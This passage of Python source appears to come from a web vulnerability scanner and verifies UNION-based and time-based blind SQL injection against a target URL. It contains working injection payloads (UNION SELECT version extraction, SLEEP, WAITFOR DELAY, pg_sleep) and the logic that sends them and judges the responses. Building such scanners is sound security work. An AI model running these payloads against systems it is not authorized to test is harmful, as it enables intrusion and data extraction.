                            cols[col_idx] = v_expr
                            ver_payload = f"' UNION SELECT {','.join(cols)}--"

                            ver_url, ver_params, ver_data, ver_json, ver_headers = self._build_request_args(
                                url, parameter, ver_payload, method, form_inputs, target=target
                            )
                            ver_resp = await self._send(
                                ver_url, method, ver_params, ver_data,
                                headers=ver_headers,
                                json_body=ver_json,
                                test_phase="union_version_extract", payload=ver_payload,
                            )

                            # ------------------------------------------------------------
                            # GUARD #2: Stop 'sqlite_version()' payload from text mirroring
                            # ------------------------------------------------------------
                            ver_body_low = (ver_resp.body or "").lower()
                            if "union select" in ver_body_low and "union select" not in baseline_body_low:
                                logger.debug(
                                    "Version extract payload keywords 'UNION SELECT' detected literally. "
                                    "Suppressing false positive caused by literal text storage/reflection."
                                )
                                continue

                            ver_sim = _body_similarity(baseline_body, ver_resp.body or "")
                            if not _similarity_in_union_window(ver_sim):
                                logger.debug(
                                    "Version extract '%s' similarity %.2f outside window %s:%s - skip",
                                    ver_payload, ver_sim, url, parameter,
                                )
                                continue

                            new_inds = _new_version_indicators(baseline_body, ver_resp.body or "")
                            if new_inds:
                                version_extracted_body = ver_resp.body
                                version_payload_used   = ver_payload
                                logger.debug(
                                    "Version extracted %s:%s via '%s' - new: %s",
                                    url, parameter, ver_payload, new_inds,
                                )
                                break

                        if version_extracted_body:
                            break

                    if version_extracted_body:
                        break

                if version_extracted_body:
                    finding = self._create_finding(
                        category=OwaspCategory.a05,
                        vuln_type="SQL Injection (UNION-Based)",
                        severity=SeverityLevel.high,
                        url=url, parameter=parameter, payload=version_payload_used,
                        evidence=(
                            f"UNION version extraction confirmed via '{version_payload_used}'. "
                            f"DB version indicator absent from baseline."
                        ),
                        confidence_score=90.0, detection_method="union_based",
                        method=method,
                        detection_evidence={
                            "version_extracted": True,
                            "canary_verified": False,
                        },
                        reproducible=True, verified=True,
                    )
                    return VerificationResult(
                        is_vulnerable=True, confidence_score=90.0,
                        detection_method="union_based", findings=[finding],
                        evidence={"version_extracted": True},
                        reproducible=True,
                    )

                # ----------------------------------------------------------------
                # Pass 4: Stable column-count differential.
                # ----------------------------------------------------------------
                n = len(valid_null_probes)
                if n < _UNION_MIN_SIGNIFICANT_PAYLOADS:
                    logger.debug(
                        "UNION differential suppressed %s:%s - only %d/%d payloads in window",
                        url, parameter, n, _UNION_MIN_SIGNIFICANT_PAYLOADS,
                    )
                    return VerificationResult(
                        is_vulnerable=False, confidence_score=0.0,
                        detection_method="union_based", findings=[],
                        evidence={
                            "suppressed": True,
                            "reason": f"only_{n}_valid_null_probes",
                        },
                    )

                best_payload, best_resp, best_sim = max(
                    valid_null_probes, key=lambda x: abs(x[2] - 0.5)
                )
                best_col_count = best_payload.count("NULL")

                confirm_col_count = best_col_count + 1 if best_col_count < 5 else best_col_count - 1
                confirm_payload = "' UNION SELECT " + ",".join(["NULL"] * confirm_col_count) + "--"

                conf_url, conf_params, conf_data, conf_json, conf_headers = self._build_request_args(
                    url, parameter, confirm_payload, method, form_inputs, target=target
                )
                conf_resp = await self._send(
                    conf_url, method, conf_params, conf_data,
                    headers=conf_headers,
                    json_body=conf_json,
                    test_phase="union_cross_column_confirm", payload=confirm_payload,
                )
                conf_sim = _body_similarity(baseline_body, conf_resp.body or "")

                if not _similarity_in_union_window(conf_sim):
                    logger.debug(
                        "UNION cross-column confirm outside window (%.2f) %s:%s - suppressed",
                        conf_sim, url, parameter,
                    )
                    return VerificationResult(
                        is_vulnerable=False, confidence_score=0.0,
                        detection_method="union_based", findings=[],
                        evidence={
                            "suppressed": True,
                            "reason": "cross_column_confirm_failed",
                            "confirm_sim": conf_sim,
                        },
                    )

                avg_sim = sum(s for _, _, s in valid_null_probes) / n
                confidence = 65.0 if avg_sim > 0.85 else 75.0

                if confidence < 75.0:
                    logger.debug(
                        "UNION differential weak (avg_sim=%.2f, confidence=%.1f) %s:%s - suppressed",
                        avg_sim, confidence, url, parameter,
                    )
                    return VerificationResult(
                        is_vulnerable=False, confidence_score=confidence,
                        detection_method="union_based", findings=[],
                        evidence={
                            "suppressed": True,
                            "reason": "weak_similarity_change",
                            "avg_sim": avg_sim,
                        },
                    )

                return VerificationResult(
                    is_vulnerable=False,
                    confidence_score=0.0,
                    detection_method="union_based",
                    findings=[],
                    evidence={
                        "suppressed": True,
                        "reason": "null_differential_without_extraction_proof",
                        "valid_null_probes": n,
                        "avg_similarity": avg_sim,
                        "confirm_sim": conf_sim,
                        "best_payload": best_payload,
                    },
                    reproducible=False,
                )

            except Exception as e:
                logger.error("UNION verification failed %s:%s: %s", url, parameter, e)
                return VerificationResult(
                    is_vulnerable=False, confidence_score=0.0,
                    detection_method="union_based", findings=[],
                    evidence={"error": str(e)},
                )
            
    # ======================================================================
    # Technique 4: Time-based blind
    # ======================================================================

    async def _verify_time_based(
        self,
        url: str,
        parameter: str,
        method: str,
        value: str,
        form_inputs: Optional[list] = None,
        pre_test_baseline: Optional[ResponseData] = None,
        target: Optional[object] = None,
    ) -> VerificationResult:
        """
        Time-based blind SQLi.

        Three safeguards:
        1. Baseline mean > 2000ms: server too slow, skip entirely.
        2. Relative floor: observed delay must be >= 60% of the intended sleep.
           A hardcoded threshold breaks on high-latency targets; 60% of expected
           is correct for both fast and slow networks.
        3. Injected mean must itself be >= 50% of sleep duration - rules out a
           coincidentally fast baseline sample making a normal response look delayed.
        """
        sleep_payloads = [
            # Standard - needs baseline_value prefix (now fixed by Fix 1)
            ("' AND SLEEP(3)--",                     3000),
            ("' AND SLEEP(3)#",                      3000),
            (" AND SLEEP(3)--",                      3000),
            # Conditional - more reliable across DVWA security levels
            ("' AND IF(1=1,SLEEP(3),0)--",           3000),
            ("' AND IF(1=1,SLEEP(3),0)#",            3000),
            # Numeric context (no quotes needed)
            (" AND IF(1=1,SLEEP(3),0)--",            3000),
            # Stacked (needs multi-statement support, usually off)
            ("'; SELECT SLEEP(3);--",               3000),
            # MSSQL / PG fallbacks
            ("'; WAITFOR DELAY '0:0:3'--",          3000),
            ("'; SELECT pg_sleep(3)--",             3000),
        ]

        try:
            baseline_url, baseline_params, baseline_data, baseline_json, baseline_headers = self._build_request_args(
                url, parameter, value, method, form_inputs, inject=False, target=target
            )

            baseline_times: list[float] = []
            if pre_test_baseline is not None:
                baseline_times.append(pre_test_baseline.response_time_ms)

            for _ in range(3 - len(baseline_times)):
                resp = await self._send(
                    baseline_url, method, baseline_params, baseline_data,
                    headers=baseline_headers,
                    json_body=baseline_json,
                    test_phase="time_baseline",
                )
                # Budget-denied baseline probe carries no timing; skip it.
                if resp.not_tested:
                    continue
                baseline_times.append(resp.response_time_ms)
                await asyncio.sleep(0.1)

            if not baseline_times:
                # Every baseline probe was budget-denied: untested, not a negative.
                return VerificationResult(
                    is_vulnerable=False, confidence_score=0.0,
                    detection_method="time_based", findings=[],
                    evidence={"skipped": "not_tested_budget_denied"},
                )

            baseline_mean = sum(baseline_times) / len(baseline_times)

            if baseline_mean > 2000:
                logger.debug(
                    "Time-based skipped %s:%s - baseline too slow (%.0fms)",
                    url, parameter, baseline_mean,
                )
                return VerificationResult(
                    is_vulnerable=False, confidence_score=0.0,
                    detection_method="time_based", findings=[],
                    evidence={"skipped": "baseline_too_slow", "baseline_mean_ms": baseline_mean},
                )

            threshold_fraction = getattr(self, "blind_timing_threshold", None) or get_settings().blind_injection_timing_threshold

            for payload, expected_ms in sleep_payloads:

                inj_url, inj_params, inj_data, inj_json, inj_headers = self._build_request_args(
                    url, parameter, payload, method, form_inputs, baseline_value=value, target=target
                )
                inj_times = []
                last_resp = None
                budget_denied = False
                for _ in range(2):
                    resp = await self._send(
                        inj_url, method, inj_params, inj_data,
                        headers=inj_headers,
                        json_body=inj_json,
                        test_phase="time_injection", payload=payload,
                    )
                    # Budget-denied probe has no timing; treat payload as untested.
                    if resp.not_tested:
                        budget_denied = True
                        break
                    inj_times.append(resp.response_time_ms)
                    last_resp = resp
                    await asyncio.sleep(0.1)

                if budget_denied:
                    continue

                is_significant, timing = ResponseAnalyzer.is_timing_significant(
                    baseline_times, inj_times,
                    threshold_ms=expected_ms * threshold_fraction,
                )
                if not is_significant:
                    continue

                diff_ms       = timing.get("diff_ms", 0)
                injected_mean = timing.get("injected_mean", 0)

                if diff_ms < expected_ms * 0.60:
                    logger.debug(
                        "Time diff %.0fms < 60%% of expected %.0fms %s:%s - jitter",
                        diff_ms, expected_ms, url, parameter,
                    )
                    continue

                if injected_mean < expected_ms * 0.50:
                    logger.debug(
                        "Injected mean %.0fms < 50%% of expected %.0fms %s:%s",
                        injected_mean, expected_ms, url, parameter,
                    )
                    continue

                confidence = 75.0

                # Build structured timing evidence for reviewer validation
                threshold_used = expected_ms * threshold_fraction
                timing_evidence = {
                    **timing,
                    "baseline_times_ms": baseline_times,
                    "injected_times_ms": inj_times,
                    "baseline_mean_ms": round(baseline_mean, 1),
                    "injected_mean_ms": round(injected_mean, 1),
                    "delta_ms": round(diff_ms, 1),
                    "expected_sleep_ms": expected_ms,
                    "threshold_ms": round(threshold_used, 1),
                }

                finding = self._create_finding(
                    category=OwaspCategory.a05,
                    vuln_type="SQL Injection (Time-Based Blind)",
                    severity=SeverityLevel.high,
                    url=url, parameter=parameter, payload=payload,
                    evidence=(
                        f"Response delayed {diff_ms:.0f}ms with sleep payload "
                        f"(baseline_mean={baseline_mean:.0f}ms, "
                        f"injected_mean={injected_mean:.0f}ms, "
                        f"delta={diff_ms:.0f}ms, "
                        f"threshold={threshold_used:.0f}ms, "
                        f"expected_sleep={expected_ms}ms)."
                    ),
                    confidence_score=confidence, detection_method="time_based",
                    method=method, detection_evidence=timing_evidence,
                    reproducible=True, verified=True,
                    verification_request_snippet=last_resp.request_snippet,
                    verification_response_snippet=last_resp.response_snippet,
                )
                return VerificationResult(
                    is_vulnerable=True, confidence_score=confidence,
                    detection_method="time_based", findings=[finding],
                    evidence=timing_evidence, reproducible=True,
                )

            return VerificationResult(
                is_vulnerable=False, confidence_score=0.0,
                detection_method="time_based", findings=[],
                evidence={"baseline_times": baseline_times},
            )

        except Exception as e:
            logger.error("Time-based verification failed %s:%s: %s", url, parameter, e)
            return VerificationResult(
                is_vulnerable=False, confidence_score=0.0,
                detection_method="time_based", findings=[],
                evidence={"error": str(e)},
            )
